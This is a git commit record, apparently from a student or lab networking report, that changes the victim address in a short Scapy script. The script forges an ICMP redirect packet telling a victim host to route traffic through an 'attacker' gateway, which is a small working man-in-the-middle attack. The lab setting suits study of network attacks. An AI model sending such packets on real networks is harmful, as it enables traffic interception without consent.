8f9353123195366267ee3e399bcccc7232c4da89
Pietro Prandini <prandinip@gmail.com>
2018-12-29 11:30:23 +0100

    ICMP Redirect

--- report/scapy/ICMPRedirect.py
+++ report/scapy/ICMPRedirect.py
@@ -2,7 +2,7 @@
 from scapy.all import *
 
 # Preparing packet
-victim = "192.168.62.10"
+victim = "192.168.62.60"
 attacker = "192.168.40.50"
 icmp_redirect_packet = IP(dst=victim)/ICMP(type=5,code=1,gw=attacker)
 send(icmp_redirect_packet)
